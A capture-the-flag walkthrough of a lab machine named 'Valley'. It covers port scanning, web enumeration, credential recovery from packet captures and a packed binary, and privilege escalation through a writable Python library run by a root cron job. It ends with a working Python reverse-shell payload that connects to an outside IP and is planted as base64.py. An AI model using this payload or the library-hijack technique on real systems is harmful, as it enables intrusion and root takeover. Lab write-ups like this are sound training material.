# Valley

### Valley
Nmap scan shows ports 22,80 and 37370 open:

    22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 c2:84:2a:c1:22:5a:10:f1:66:16:dd:a0:f6:04:62:95 (RSA)
    |   256 42:9e:2f:f6:3e:5a:db:51:99:62:71:c4:8c:22:3e:bb (ECDSA)
    |_  256 2e:a0:a5:6c:d9:83:e0:01:6c:b9:8a:60:9b:63:86:72 (ED25519)
    80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-title: Site doesn't have a title (text/html).
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    37370/tcp open  ftp     vsftpd 3.0.3
Enumerating website on port 80, I found a note in `/pricing/note.txt`:<br />
![image](https://github.com/user-attachments/assets/d41448e2-b949-42a2-a742-936c4f6096a5)<br />
With further enumeration I find `/static/00`:<br />
![image](https://github.com/user-attachments/assets/cfa3c3ab-5ac7-4387-9103-d5eff5b097eb)<br />
So I go to `/dev1243224123123` and get a login page:<br />
![image](https://github.com/user-attachments/assets/663920c6-689e-4ef1-954e-9ca81a65cb25)<br />
I look at the source code of this page and find even more information inside `/dev.js`:<br />
![image](https://github.com/user-attachments/assets/f4d65eed-1b35-48ac-b7ea-35a3b20cf689)<br />
![image](https://github.com/user-attachments/assets/564efeff-9cc1-4a27-b5d5-6183b7a29dde)<br />
So I'm able to log into the ftp server with credentials `siemDev:california`. The ftp server contains e file with extension `.pcapng`. One is about FTP communication, the other two captured HTTP traffic. I used wireshark to analyzed these packet captures, and, after applying an http filter, I found a POST request containing a set of credentials:<br />
![image](https://github.com/user-attachments/assets/30093f22-43e4-4eee-a116-acc1c7572331)<br />
This got me the first flag. Inside `/home` there's an executable called `valleyAuthenticator`. If I run it it prompts for a username and a password. I want to check if credentials are hardcoded inside this executable. <br />
To do that, I transfer it on my local machine (I called it `auth)`, and analyze it with IDA. I immediately find something from the strings:<br />
![image](https://github.com/user-attachments/assets/92298a32-5c87-4c87-809b-3e3339d2262f)<br />
This binary is packed with UTX. To unpack it from the terminal, I run `upx -d auth`. Now that the code is unpacked, I ask mr. GPT to give me a command to see only the strings that are close to the strings `username` and `password`, because the file is too big. So I run `strings -a auth | grep -i -A 3 -B 3 "username\|password"` and got the following result:<br />
![image](https://github.com/user-attachments/assets/681b17af-0087-43c2-a2bf-ca1f01bd2ea9)<br />
Apparently I found two hash values. I immediately try with crackstation to crack them, and it's successful:<br />
![image](https://github.com/user-attachments/assets/4ae49775-9009-4bae-8c92-bf62e8d776f1)<br />
So I used these credentials to access valley's account with the `su` command. Next, I checked for cronjobs with `cat /etc/crontab`:<br />
![image](https://github.com/user-attachments/assets/48679cab-2d60-429a-bc05-1b931377d994)<br />
A python script is executed by root every minute, and this is the code: <br />
![image](https://github.com/user-attachments/assets/49a1ab22-941e-4da5-9596-f2d7e6b56bf1)<br />
This script takes a set of images inside the `/script` folder and base64 encodes them. Luckily for me, I (valley) am the owner of those images!<br />
![image](https://github.com/user-attachments/assets/b96d0616-51ed-48d3-815d-acb787ece1f0)<br />
This means that I can create my own file named, for example, `p1.jpg` to feed this script. So for example, if I run `echo "test" > p1.jpg` and wait a few seconds, I get:<br />
![image](https://github.com/user-attachments/assets/674900e5-5515-453b-aad0-75a119466f5d)<br />
which is the base64 encoding of `test`. <br /><br />
After contemplating what could be the solution to become root, I realized that the vulnerability actually relies on the fact that the base64 library is owned by the group `valleyAdmin`, which I'm part of. This means that I can just modify the code inside this library, which will be executed whenever the library is invoked.<br />
Run:

        mv /usr/lib/python3.8/base64.py /usr/lib/python3.8/base64.bak.py
        nano /usr/lib/python3.8/base64.py

Inside the new base64 fake library, I put the following code: <br >

        #!/usr/bin/python3
        from os import dup2
        from subprocess import run
        import socket
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("10.11.85.53",9001)) 
        dup2(s.fileno(),0) 
        dup2(s.fileno(),1) 
        dup2(s.fileno(),2)     
        run(["/bin/bash","-i"])
Now I open a netcat listener on port 9001 and get a reverse root shell after a few seconds.















